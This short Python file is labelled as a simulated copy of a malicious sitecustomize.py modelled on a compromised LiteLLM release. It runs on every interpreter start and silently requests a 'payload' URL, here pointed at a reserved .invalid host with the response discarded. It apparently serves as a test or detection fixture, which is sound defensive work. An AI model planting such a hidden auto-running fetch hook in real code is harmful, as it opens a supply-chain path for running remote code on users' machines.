# SIMULATED loader shaped like LiteLLM 1.107.0's `sitecustomize.py`, which
# fetched a payload whenever an interpreter started. This one only attempts a
# GET to a reserved `.invalid` host and discards any answer.
try:
    import urllib.request

    urllib.request.urlopen("https://stage2.drydock-test.invalid/payload", timeout=3).read(0)
except Exception:
    pass
